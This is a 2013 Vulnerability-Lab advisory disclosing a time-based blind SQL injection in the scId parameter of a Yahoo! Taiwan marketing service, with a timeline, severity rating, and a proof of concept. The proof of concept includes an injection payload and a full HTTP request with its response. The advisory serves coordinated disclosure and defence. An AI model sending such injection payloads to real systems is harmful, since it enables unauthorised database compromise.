Title:
======
Yahoo! TW YSM MKT - Blind SQL Injection Vulnerability


Date:
=====
2013-04-03


References:
===========
http://www.vulnerability-lab.com/get_content.php?id=892


VL-ID:
=====
892


Common Vulnerability Scoring System:
====================================
7.1


Introduction:
=============
Yahoo! Inc. is an American multinational internet corporation headquartered in Sunnyvale, California. It is widely 
known for its web portal, search engine Yahoo! Search, and related services, including Yahoo! Directory, Yahoo! Mail, 
Yahoo! News, Yahoo! Finance, Yahoo! Groups, Yahoo! Answers, advertising, online mapping, video sharing, fantasy sports 
and its social media website. It is one of the most popular sites in the United States. According to news sources, 
roughly 700 million people visit Yahoo! websites every month. Yahoo! itself claims it attracts `more than half a 
billion consumers every month in more than 30 languages.

(Copy of the Vendor Homepage: http://www.yahoo.com )


Abstract:
=========
An independent researcher (Ebrahim Hegazy) discovered a blind sql injection vulnerability in the Yahoo! Inc TW Marketing Service Application.


Report-Timeline:
================
2013-02-24:	Researcher Notification & Coordination
2013-02-25:	Vendor Notification
2013-03-01:	Vendor Response/Feedback
2013-04-01:	Vendor Fix/Patch by check
2013-04-03:	Public Disclosure


Status:
========
Published


Exploitation-Technique:
=======================
Remote


Severity:
=========
Critical


Details:
========
A time based blind SQL Injection web vulnerability is detected in the official Yahoo! TW YSM Marketing Application Service.
The vulnerability allows remote attackers to inject own sql commands to compromise the affected application dbms. 

The SQL Injection vulnerability is located in the index.php file of the soeasy module when processing to request manipulated 
scId parameters. By manipulation of the scId parameter the attackers can inject own sql commands to compromise the webserver 
application dbms.

The vulnerability can be exploited by remote attackers without privileged application user account and without required 
user interaction. Successful exploitation of the sql injection vulnerability results in application and application 
service dbms compromise.

Vulnerable Service(s):
				[+] Yahoo! Inc - TW YSM Marketing

Vulnerable Module(s):
				[+] soeasy

Vulnerable Module(s):
				[+] index.php

Vulnerable Parameter(s):
				[+] scId


Proof of Concept:
=================
The time-based sql injection web vulnerability can be exploited by remote attackers without privileged application user account and without 
required user interaction. For demonstration or reproduce ...

Vulnerable Service Domain:		tw.ysm.emarketing.yahoo.com
Vulnerable Module:			soeasy
Vulnerable File:			index.php
Vulnerable Parameters:			?p=2&scId=

POC:
http://tw.ysm.emarketing.yahoo.com/soeasy/index.php?p=2&scId=113; select SLEEP(5)--

Payload:
1; union select SLEEP(5)--


Request:
http://tw.ysm.emarketing.yahoo.com/soeasy/index.php?p=2&scId=113;%20select%20SLEEP(5)--

GET /soeasy/index.php?p=2&scId=113;%20select%20SLEEP(5)-- HTTP/1.1
Host: tw.ysm.emarketing.yahoo.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:19.0) Gecko/20100101 Firefox/19.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: is_c=1; device=pc; showNews=Y; B=9tgpb118ilu04&b=3&s=mu; AO=o=1&s=1&dnt=1; tw_ysm_soeasy=d%3D351d9185185129780476f856.
17880929%26s%3DxLxK2mb96diFbErWUyv_jGQ--; __utma=266114698.145757337399.1361672202.1361672202.1361672202.1; __utmb=2663114698.
1.10.1361672202; __utmc=2636114698; __utmz=266114698.13616732202.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)
DNT: 1
Connection: keep-alive

HTTP/1.0 200 OK
Date: Sun, 24 Feb 2013 02:16:48 GMT
P3P: policyref="http://info.yahoo.com/w3c/p3p.xml", CP="CAO DSP COR CUR ADM DEV TAI PSA PSD IVAi IVDi CONi TELo OTPi OUR DELi 
SAMi OTRi UNRi PUBi IND PHY ONL UNI PUR FIN COM NAV INT DEM CNT STA POL HEA PRE LOC GOV"
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0, private
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
Content-Encoding: gzip


Note:
Since it'a time based blind so the page will not give an output as a result in the reply, but it will SLEEP/DELAY for 5 seconds before it load.


Solution:
=========
The vulnerability can be patched by a restriction and secure parse of the scId parameter request.


Risk:
=====
The security risk of the time based blind sql injection web vulnerability is estimated as critical.


Credits:
========
Vulnerability Laboratory [Research Team] - Ebrahim Hegazy [hegazy@vulnerability-lab.com] (research@vulnerability-lab.com)


Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases 
or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.vulnerability-lab.com/register
Contact:    admin@vulnerability-lab.com 	- support@vulnerability-lab.com 	       - research@vulnerability-lab.com
Section:    video.vulnerability-lab.com 	- forum.vulnerability-lab.com 		       - news.vulnerability-lab.com
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other 
media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, sourcecode, videos and 
other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), 
modify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.

    				   	Copyright © 2013 | Vulnerability Laboratory



-- 
VULNERABILITY RESEARCH LABORATORY
LABORATORY ADMINISTRATION
CONTACT: admin@vulnerability-lab.com

